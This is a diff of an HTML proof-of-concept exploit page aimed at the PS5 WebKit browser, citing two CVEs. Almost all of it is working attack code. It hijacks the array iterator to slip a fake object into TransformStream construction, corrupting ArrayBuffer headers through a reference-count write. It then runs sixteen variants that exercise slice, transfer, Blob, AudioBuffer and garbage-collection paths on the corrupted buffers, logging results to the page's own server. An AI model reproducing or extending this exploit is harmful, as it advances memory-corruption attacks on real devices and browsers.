@@ -1,75 +1,659 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>PS5 WebKit Probe</title></head>
+<head>
+<meta charset="utf-8">
+<title>PS5 — ArrayBuffer × TransformStream Merge (CVE-2026-43716 + CVE-2026-43705)</title>
+<style>
+body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 20px; }
+button { background: #1a1a2e; color: #0f0; border: 1px solid #0f0; padding: 10px 15px; margin: 4px; cursor: pointer; font-family: monospace; }
+button:hover { background: #0f0; color: #000; }
+#out { background: #111; border: 1px solid #333; padding: 15px; margin-top: 15px; white-space: pre-wrap; max-height: 600px; overflow-y: auto; font-size: 12px; }
+.danger { color: #f44; }
+.safe { color: #0f0; }
+.warn { color: #fa0; }
+</style>
+</head>
 <body>
-<h1>CVE-2026-43705 probe — PS5 FW 13.40</h1>
-<pre id="out">starting...</pre>
+<h3>🔬 ArrayBuffer × TransformStream Merge — PS5 FW 13.42</h3>
+<p>Corrupt ArrayBuffer header via TransformStream <code>Ref::ref()</code>, then trigger ArrayBuffer ops.</p>
+
+<div>
+  <b>Phase 1 — Corruption Primitives:</b><br>
+  <button onclick="run('A1')">A1: Basic AB corruption</button>
+  <button onclick="run('A2')">A2: Multi-channel AB</button>
+  <button onclick="run('A3')">A3: Detached AB target</button>
+  <button onclick="run('A4')">A4: TypedArray view corruption</button>
+  <br><br>
+  <b>Phase 2 — Trigger Vulnerable Paths:</b><br>
+  <button onclick="run('B1')">B1: slice() after corruption</button>
+  <button onclick="run('B2')">B2: transfer() after corruption</button>
+  <button onclick="run('B3')">B3: grow-like realloc</button>
+  <button onclick="run('B4')">B4: multi-ref AB</button>
+  <br><br>
+  <b>Phase 3 — Cross-Component Interaction:</b><br>
+  <button onclick="run('C1')">C1: AB → AudioBuffer</button>
+  <button onclick="run('C2')">C2: AB → FileReader</button>
+  <button onclick="run('C3')">C3: AB → Response.arrayBuffer()</button>
+  <button onclick="run('C4')">C4: AB → Blob</button>
+  <br><br>
+  <b>Phase 4 — Aggressive Stress:</b><br>
+  <button onclick="run('D1')">D1: Rapid alloc/free loop</button>
+  <button onclick="run('D2')">D2: Nested corruption</button>
+  <button onclick="run('D3')">D3: GC pressure + corruption</button>
+  <button onclick="run('D4')">D4: All-in-one chain</button>
+  <br><br>
+  <button onclick="clearOut()" style="background:#300;color:#f44;border-color:#f44;">Clear Log</button>
+</div>
+
+<hr>
+<pre id="out"></pre>
+
 <script>
-// ---------- telemetry (same-origin, no mixed-content issues) ----------
-function beacon(m){
-    try { navigator.sendBeacon('/stage?m=' + encodeURIComponent(m)); } catch(e){}
-    try { fetch('/stage?m=' + encodeURIComponent(m), {mode:'no-cors'}); } catch(e){}
-    try { var i = new Image(); i.src = '/stage?m=' + encodeURIComponent(m); } catch(e){}
-    document.getElementById('out').textContent += '\n' + m;
-}
-setInterval(function(){ beacon('heartbeat'); }, 1000);
-function log(m){ beacon(m); }
-
-log('boot');
-log('streams=' + typeof TransformStream + '/' + typeof ReadableStream + '/' + typeof WritableStream);
-log('iter=' + (Array.prototype[Symbol.iterator] ? 'present' : 'missing'));
-
+// ===== Infrastructure =====
+var pageId = Math.random().toString(36).slice(2, 8);
+var currentVariant = 'menu';
 var originalIterator = Array.prototype[Symbol.iterator];
 
-function triggerVariant(n, iterFn){
-    Array.prototype[Symbol.iterator] = iterFn;
-    log('V' + n + ' start');
-    var ts;
-    try {
-        ts = new TransformStream();
-        log('V' + n + ' constructed');
-    } catch(e){
-        log('V' + n + ' threw: ' + e);
-        Array.prototype[Symbol.iterator] = originalIterator;
-        return;
+function beacon(m) {
+    try { navigator.sendBeacon('/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m)); } catch(e){}
+    try { var i = new Image(); i.src = '/s?p=' + pageId + '&v=' + currentVariant + '&m=' + encodeURIComponent(m); } catch(e){}
+    var out = document.getElementById('out');
+    var line = document.createElement('div');
+    var ts = new Date().toLocaleTimeString();
+    if (m.indexOf('💀') !== -1 || m.indexOf('CRASH') !== -1 || m.indexOf('DIED') !== -1) {
+        line.className = 'danger';
+    } else if (m.indexOf('⚠️') !== -1 || m.indexOf('THREW') !== -1) {
+        line.className = 'warn';
+    } else {
+        line.className = 'safe';
     }
-    try { log('V' + n + ' .readable=' + ts.readable); } catch(e){ log('V' + n + ' .readable threw: ' + e); }
-    try { log('V' + n + ' .writable=' + ts.writable); } catch(e){ log('V' + n + ' .writable threw: ' + e); }
-    Array.prototype[Symbol.iterator] = originalIterator;
-    log('V' + n + ' done');
+    line.textContent = '[' + ts + '] ' + m;
+    out.appendChild(line);
+    out.scrollTop = out.scrollHeight;
 }
 
-// Variant 1 — plain objects بدل readable/writable
-triggerVariant(1, function(){
-    var i = 0;
-    return { next: function(){
-        if (i >= this._arr.length) return { done: true };
-        var val = this._arr[i];
-        if (this._arr.length === 3 && i >= 1) val = { fake: true };
-        i++;
-        return { value: val, done: false };
-    }, _arr: this };
-});
+function clearOut() {
+    document.getElementById('out').innerHTML = '';
+    beacon('=== log cleared ===');
+}
 
-// Variant 2 — كائن يحمل heap pointer
-triggerVariant(2, function(){
-    var buf = new ArrayBuffer(65536);
-    var i = 0;
-    return { next: function(){
-        if (i >= this._arr.length) return { done: true };
-        var val = this._arr[i];
-        if (this._arr.length === 3 && i >= 1) val = { pad: 0, ptr: buf, data: 0x41414141 };
-        i++;
-        return { value: val, done: false };
-    }, _arr: this };
-});
+function probe(name, fn) {
+    beacon('> ' + name);
+    try {
+        var v = fn();
+        var tag = Object.prototype.toString.call(v);
+        var s = '';
+        try { s = String(v); } catch(e){ s = '[unstringable]'; }
+        beacon(name + ' ✅ OK | type=' + tag + ' | val=' + s.slice(0, 100));
+        return v;
+    } catch(e) {
+        beacon(name + ' ⚠️ THREW ' + e.name + ': ' + String(e.message).slice(0, 120));
+        return undefined;
+    }
+}
 
-// Variant 3 — iterator مقطوع (صفر عناصر)
-triggerVariant(3, function(){
-    return { next: function(){ return { done: true }; } };
-});
+// ===== Core Primitive: Build Fake TransformStream =====
+function buildFake(slot1Value) {
+    var fake = { a: 0, b: slot1Value, c: 0 };
+    Array.prototype[Symbol.iterator] = function() {
+        var arr = this, i = 0;
+        return {
+            next: function() {
+                if (i >= arr.length) return { done: true };
+                var val = arr[i];
+                if (arr.length === 3 && i >= 1) val = fake;
+                i++;
+                return { value: val, done: false };
+            }
+        };
+    };
+    var ts = null;
+    try {
+        ts = new TransformStream();
+    } catch(e) {
+        beacon('construct THREW ' + e.name);
+    }
+    Array.prototype[Symbol.iterator] = originalIterator;
+    return ts;
+}
 
-log('finished');
+// ===== Phase 1: Corruption Primitives =====
+var RUNS = {};
+
+/* A1: Basic ArrayBuffer corruption */
+RUNS['A1'] = function() {
+    beacon('=== A1: Basic AB Corruption ===');
+    var victim = new ArrayBuffer(0x100);
+    var view = new Uint32Array(victim);
+    for (var i = 0; i < view.length; i++) view[i] = 0x41414141;
+    
+    beacon('AB created, view[0]=0x' + view[0].toString(16));
+    
+    var ts = buildFake(victim);
+    if (!ts) { beacon('💀 buildFake failed'); return; }
+    
+    beacon('TransformStream constructed — Ref::ref() wrote +1 to AB header');
+    beacon('AB view[0] after corruption=0x' + view[0].toString(16));
+    
+    // Try to read from the corrupted AB
+    probe('read AB[0]', function() { return view[0]; });
+    probe('read AB[4]', function() { return view[4]; });
+    
+    // Try to write
+    probe('write AB[0]=0x42424242', function() { view[0] = 0x42424242; return view[0]; });
+    
+    beacon('done');
+};
+
+/* A2: Multi-channel / structured AB */
+RUNS['A2'] = function() {
+    beacon('=== A2: Multi-Channel AB Corruption ===');
+    var ab1 = new ArrayBuffer(0x40);
+    var ab2 = new ArrayBuffer(0x40);
+    var ab3 = new ArrayBuffer(0x40);
+    
+    var v1 = new Uint32Array(ab1);
+    var v2 = new Uint32Array(ab2);
+    var v3 = new Uint32Array(ab3);
+    v1[0] = 0x11111111; v2[0] = 0x22222222; v3[0] = 0x33333333;
+    
+    beacon('Before: ab1=0x' + v1[0].toString(16) + ' ab2=0x' + v2[0].toString(16) + ' ab3=0x' + v3[0].toString(16));
+    
+    // Corrupt ab2 via TransformStream
+    var ts = buildFake(ab2);
+    if (!ts) return;
+    
+    beacon('After corruption: ab1=0x' + v1[0].toString(16) + ' ab2=0x' + v2[0].toString(16) + ' ab3=0x' + v3[0].toString(16));
+    
+    // Check if corruption leaked to adjacent ABs
+    probe('ab1 still valid?', function() { v1[1] = 0xDEADBEEF; return v1[1]; });
+    probe('ab3 still valid?', function() { v3[1] = 0xCAFEBABE; return v3[1]; });
+    
+    beacon('done');
+};
+
+/* A3: Detached AB as target */
+RUNS['A3'] = function() {
+    beacon('=== A3: Detached AB Target ===');
+    var ab = new ArrayBuffer(0x100);
+    var view = new Uint8Array(ab);
+    view[0] = 0xAA;
+    
+    // Try to detach then use in buildFake
+    // Note: structuredClone with transfer might detach
+    try {
+        var cloned = structuredClone(ab, { transfer: [ab] });
+        beacon('AB detached via structuredClone');
+    } catch(e) {
+        beacon('structuredClone detach: ' + e.name);
+    }
+    
+    // Use the (possibly detached) AB in fake
+    var ts = buildFake(ab);
+    if (!ts) return;
+    
+    probe('access detached AB', function() {
+        var v = new Uint8Array(ab);
+        return v[0];
+    });
+    
+    beacon('done');
+};
+
+/* A4: TypedArray view corruption */
+RUNS['A4'] = function() {
+    beacon('=== A4: TypedArray View Corruption ===');
+    var ab = new ArrayBuffer(0x100);
+    var u8 = new Uint8Array(ab);
+    var u32 = new Uint32Array(ab);
+    var f64 = new Float64Array(ab);
+    
+    u32[0] = 0x12345678;
+    beacon('Initial u32[0]=0x' + u32[0].toString(16));
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    
+    beacon('After corruption:');
+    probe('u8[0-3]', function() { return [u8[0], u8[1], u8[2], u8[3]].map(x => x.toString(16)).join(' '); });
+    probe('u32[0]', function() { return '0x' + u32[0].toString(16); });
+    probe('f64[0]', function() { return f64[0]; });
+    
+    // Try creating new views on corrupted AB
+    probe('new view on corrupted', function() {
+        var v = new Int32Array(ab);
+        return v[0];
+    });
+    
+    beacon('done');
+};
+
+// ===== Phase 2: Trigger Vulnerable Paths =====
+
+/* B1: slice() after corruption */
+RUNS['B1'] = function() {
+    beacon('=== B1: slice() After Corruption ===');
+    var ab = new ArrayBuffer(0x200);
+    var view = new Uint32Array(ab);
+    view[0] = 0xAAAAAAAA;
+    view[1] = 0xBBBBBBBB;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB header corrupted');
+    
+    probe('ab.slice(0, 0x10)', function() {
+        var sliced = ab.slice(0, 0x10);
+        var v = new Uint32Array(sliced);
+        return 'sliced[0]=0x' + v[0].toString(16);
+    });
+    
+    probe('ab.slice(0x100, 0x200)', function() {
+        var sliced = ab.slice(0x100, 0x200);
+        return 'sliced len=' + sliced.byteLength;
+    });
+    
+    beacon('done');
+};
+
+/* B2: transfer() after corruption */
+RUNS['B2'] = function() {
+    beacon('=== B2: transfer() After Corruption ===');
+    var ab = new ArrayBuffer(0x100);
+    var view = new Uint32Array(ab);
+    view[0] = 0xDEADBEEF;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB header corrupted');
+    
+    probe('structuredClone transfer', function() {
+        var transferred = structuredClone(ab, { transfer: [ab] });
+        return 'transferred len=' + transferred.byteLength;
+    });
+    
+    probe('access original after transfer', function() {
+        var v = new Uint32Array(ab);
+        return v[0];
+    });
+    
+    beacon('done');
+};
+
+/* B3: grow-like realloc via multiple views */
+RUNS['B3'] = function() {
+    beacon('=== B3: Grow-like Realloc Stress ===');
+    var ab = new ArrayBuffer(0x100);
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    
+    // Create many views pointing to same corrupted AB
+    var views = [];
+    for (var i = 0; i < 50; i++) {
+        try {
+            views.push(new Uint8Array(ab, 0, 0x100));
+        } catch(e) {
+            beacon('view ' + i + ' failed: ' + e.name);
+            break;
+        }
+    }
+    beacon('Created ' + views.length + ' views on corrupted AB');
+    
+    // Write through different views
+    for (var i = 0; i < views.length; i++) {
+        views[i][0] = i & 0xFF;
+    }
+    beacon('Wrote through all views');
+    
+    probe('consistency check', function() {
+        var first = views[0][0];
+        for (var i = 1; i < views.length; i++) {
+            if (views[i][0] !== first) return 'INCONSISTENT at ' + i;
+        }
+        return 'consistent, val=' + first;
+    });
+    
+    beacon('done');
+};
+
+/* B4: multi-ref AB — refcount stress */
+RUNS['B4'] = function() {
+    beacon('=== B4: Multi-Ref Refcount Stress ===');
+    var ab = new ArrayBuffer(0x100);
+    
+    // Create multiple references
+    var refs = [];
+    for (var i = 0; i < 100; i++) {
+        refs.push(ab);
+    }
+    beacon('Created ' + refs.length + ' references');
+    
+    // Corrupt via TransformStream (writes +1 to refcount area)
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('Corrupted AB with ' + refs.length + ' active refs');
+    
+    // Drop references one by one
+    for (var i = 0; i < refs.length; i++) {
+        refs[i] = null;
+    }
+    beacon('Dropped all refs');
+    
+    // Try GC
+    if (typeof window.gc === 'function') {
+        try { window.gc(); beacon('gc() ok'); } catch(e) { beacon('gc() failed'); }
+    }
+    
+    // Try accessing the AB
+    probe('access after drop', function() {
+        var v = new Uint32Array(ab);
+        return v[0];
+    });
+    
+    beacon('done');
+};
+
+// ===== Phase 3: Cross-Component Interaction =====
+
+/* C1: AB → AudioBuffer */
+RUNS['C1'] = function() {
+    beacon('=== C1: AB → AudioBuffer ===');
+    var ab = new ArrayBuffer(0x1000);
+    var view = new Float32Array(ab);
+    view[0] = 1.0; view[1] = 0.5; view[2] = -0.5;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted');
+    
+    try {
+        var ctx = new AudioContext();
+        beacon('AudioContext created');
+        
+        probe('createBuffer from AB', function() {
+            var buf = ctx.createBuffer(1, 0x400, 44100);
+            // Try to copy from corrupted AB
+            var src = new Float32Array(ab, 0, 0x400);
+            var dst = buf.getChannelData(0);
+            for (var i = 0; i < 10; i++) dst[i] = src[i];
+            return 'copied 10 samples';
+        });
+        
+        probe('createBufferSource', function() {
+            var src = ctx.createBufferSource();
+            src.buffer = ctx.createBuffer(1, 0x100, 44100);
+            return 'BufferSource ok';
+        });
+        
+    } catch(e) {
+        beacon('AudioContext error: ' + e.name);
+    }
+    
+    beacon('done');
+};
+
+/* C2: AB → FileReader */
+RUNS['C2'] = function() {
+    beacon('=== C2: AB → FileReader ===');
+    var ab = new ArrayBuffer(0x100);
+    var view = new Uint8Array(ab);
+    for (var i = 0; i < 0x100; i++) view[i] = i;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted');
+    
+    probe('Blob from corrupted AB', function() {
+        var blob = new Blob([ab]);
+        return 'blob size=' + blob.size;
+    });
+    
+    probe('FileReader read', function() {
+        return new Promise(function(resolve) {
+            var blob = new Blob([ab]);
+            var reader = new FileReader();
+            reader.onload = function(e) {
+                var result = new Uint8Array(e.target.result);
+                resolve('read ' + result.length + ' bytes, first=0x' + result[0].toString(16));
+            };
+            reader.onerror = function(e) {
+                resolve('error: ' + reader.error.name);
+            };
+            reader.readAsArrayBuffer(blob);
+        });
+    });
+    
+    beacon('done');
+};
+
+/* C3: AB → Response.arrayBuffer() */
+RUNS['C3'] = function() {
+    beacon('=== C3: AB → Response.arrayBuffer() ===');
+    var ab = new ArrayBuffer(0x100);
+    var view = new Uint8Array(ab);
+    view[0] = 0x99;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted');
+    
+    probe('Response from AB', function() {
+        var blob = new Blob([ab]);
+        var resp = new Response(blob);
+        return 'Response ok, type=' + resp.type;
+    });
+    
+    probe('Response.arrayBuffer()', function() {
+        return new Promise(function(resolve) {
+            var blob = new Blob([ab]);
+            var resp = new Response(blob);
+            resp.arrayBuffer().then(function(buf) {
+                var v = new Uint8Array(buf);
+                resolve('arrayBuffer ok, len=' + buf.byteLength + ' first=0x' + v[0].toString(16));
+            }).catch(function(e) {
+                resolve('arrayBuffer rejected: ' + e.name);
+            });
+        });
+    });
+    
+    beacon('done');
+};
+
+/* C4: AB → Blob */
+RUNS['C4'] = function() {
+    beacon('=== C4: AB → Blob ===');
+    var ab = new ArrayBuffer(0x100);
+    var view = new Uint32Array(ab);
+    view[0] = 0xB10BB10B;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted');
+    
+    probe('Blob constructor', function() {
+        var blob = new Blob([ab, ab, ab]);
+        return 'blob size=' + blob.size;
+    });
+    
+    probe('Blob.slice', function() {
+        var blob = new Blob([ab]);
+        var sliced = blob.slice(0, 0x10);
+        return 'sliced size=' + sliced.size;
+    });
+    
+    probe('URL.createObjectURL', function() {
+        var blob = new Blob([ab]);
+        var url = URL.createObjectURL(blob);
+        return 'url=' + url.slice(0, 30);
+    });
+    
+    beacon('done');
+};
+
+// ===== Phase 4: Aggressive Stress =====
+
+/* D1: Rapid alloc/free loop */
+RUNS['D1'] = function() {
+    beacon('=== D1: Rapid Alloc/Free Loop ===');
+    var count = 0;
+    var interval = setInterval(function() {
+        count++;
+        var ab = new ArrayBuffer(0x100);
+        var ts = buildFake(ab);
+        if (ts) {
+            // Immediately drop
+            ts = null; ab = null;
+        }
+        if (count >= 50) {
+            clearInterval(interval);
+            beacon('Completed ' + count + ' iterations');
+            beacon('done');
+        }
+    }, 50);
+    beacon('Started rapid loop...');
+};
+
+/* D2: Nested corruption */
+RUNS['D2'] = function() {
+    beacon('=== D2: Nested Corruption ===');
+    var ab = new ArrayBuffer(0x100);
+    
+    // Corrupt once
+    var ts1 = buildFake(ab);
+    beacon('First corruption');
+    
+    // Corrupt again with same AB
+    var ts2 = buildFake(ab);
+    beacon('Second corruption (+2 total on header)');
+    
+    // And again
+    var ts3 = buildFake(ab);
+    beacon('Third corruption (+3 total on header)');
+    
+    probe('AB still accessible?', function() {
+        var v = new Uint32Array(ab);
+        return 'v[0]=0x' + v[0].toString(16);
+    });
+    
+    beacon('done');
+};
+
+/* D3: GC pressure + corruption */
+RUNS['D3'] = function() {
+    beacon('=== D3: GC Pressure + Corruption ===');
+    var ab = new ArrayBuffer(0x10000);
+    var view = new Uint32Array(ab);
+    view[0] = 0xCAFEBABE;
+    
+    var ts = buildFake(ab);
+    if (!ts) return;
+    beacon('AB corrupted');
+    
+    // Massive allocation to pressure GC
+    var pressure = [];
+    for (var i = 0; i < 500; i++) {
+        pressure.push(new ArrayBuffer(0x10000));
+    }
+    beacon('Allocated ' + pressure.length + ' MB');
+    
+    // Try GC
+    if (typeof window.gc === 'function') {
+        try { window.gc(); beacon('gc() ok'); } catch(e) { beacon('gc() failed'); }
+    }
+    
+    // Access corrupted AB
+    probe('AB after GC pressure', function() {
+        return 'v[0]=0x' + view[0].toString(16);
+    });
+    
+    // Free pressure
+    pressure = null;
+    beacon('Pressure released');
+    
+    beacon('done');
+};
+
+/* D4: All-in-one chain */
+RUNS['D4'] = function() {
+    beacon('=== D4: ALL-IN-ONE CHAIN ===');
+    
+    // Step 1: Create AB
+    var ab = new ArrayBuffer(0x200);
+    var u32 = new Uint32Array(ab);
+    u32[0] = 0x11111111;
+    u32[1] = 0x22222222;
+    beacon('Step 1: AB created');
+    
+    // Step 2: Corrupt via TransformStream
+    var ts = buildFake(ab);
+    if (!ts) { beacon('💀 Step 2 failed'); return; }
+    beacon('Step 2: AB header corrupted via Ref::ref()');
+    
+    // Step 3: Create views
+    var u8 = new Uint8Array(ab);
+    var f64 = new Float64Array(ab);
+    beacon('Step 3: Multiple views created');
+    
+    // Step 4: Slice
+    probe('Step 4: slice()', function() {
+        var s = ab.slice(0, 0x20);
+        return 'slice len=' + s.byteLength;
+    });
+    
+    // Step 5: Blob
+    probe('Step 5: Blob', function() {
+        var b = new Blob([ab, ab]);
+        return 'blob size=' + b.size;
+    });
+    
+    // Step 6: Transfer
+    probe('Step 6: structuredClone', function() {
+        var cloned = structuredClone(ab, { transfer: [ab] });
+        return 'cloned len=' + cloned.byteLength;
+    });
+    
+    // Step 7: Audio (if available)
+    try {
+        var ctx = new AudioContext();
+        probe('Step 7: AudioBuffer', function() {
+            var buf = ctx.createBuffer(1, 0x100, 44100);
+            var data = buf.getChannelData(0);
+            data[0] = 1.0;
+            return 'AudioBuffer ok';
+        });
+    } catch(e) {
+        beacon('Step 7: AudioContext not available');
+    }
+    
+    // Step 8: Final access
+    probe('Step 8: Final AB access', function() {
+        return 'u32[0]=0x' + u32[0].toString(16) + ' u8[0]=0x' + u8[0].toString(16);
+    });
+    
+    beacon('=== CHAIN COMPLETE ===');
+};
+
+// ===== Main Runner =====
+function run(v) {
+    currentVariant = v;
+    beacon('\\n>>> BOOT v=' + v + ' <<<');
+    try {
+        var result = RUNS[v]();
+        if (result && typeof result.then === 'function') {
+            result.then(function(r) {
+                beacon('async result: ' + r);
+            }).catch(function(e) {
+                beacon('async error: ' + e.name);
+            });
+        }
+    } catch(e) {
+        beacon('💀 RUN THREW ' + e.name + ': ' + e.message);
+    }
+}
+
+beacon('\\n🟢 PoC Loaded — PS5 ArrayBuffer × TransformStream Merge');
+beacon('Select a test from the menu above.');
 </script>
 </body>
 </html>
